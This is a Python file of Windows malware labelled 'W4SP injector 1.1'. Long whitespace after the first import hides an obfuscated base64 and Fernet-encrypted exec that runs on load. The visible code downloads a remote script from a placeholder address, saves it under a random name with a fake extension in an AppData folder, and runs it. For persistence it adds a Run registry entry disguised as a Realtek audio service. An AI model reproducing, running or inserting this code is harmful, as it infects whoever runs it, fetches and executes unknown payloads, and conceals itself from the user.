import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1lJek9DeHhkOUdlSURvdHB4aDRkTDREZkRjQ0htaTdyV3hIMTQ1OHJYV1k9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjV6aU1KcG0wRWhRWVJvUGMtbEtLN2t0RUg4d2tieW9TVkROanhjLTZFVjJVYy1KMmVVcWlzZGxlRHB3Zk1WZW5tQXI2UmZJOFJVbUxSQmxqZFl6V0NDSmhCckNEMXVjd0xJOHl4a2xNcmtNdUd0WmtCTkt5V2NScWJQcEF4Z2x1bnp3MlZlVlV4REpiWFc2RVpJX2w5c0dzN01GVTNYZ2NnRklhMEtiZ2djNXVXU2hBZ1JxUUg0aXR0clg1N3VHRVNEVmVKVFdjY1VDb1FzZFptQUIwZzYxZXlQWGxQSWtiX0M1SWM3S0FXQW5KWnc9Jykp').decode())
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

import contextlib
DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
with contextlib.suppress(Exception):
    startUP(DoYouKnowTheWay)
print('kwdmln')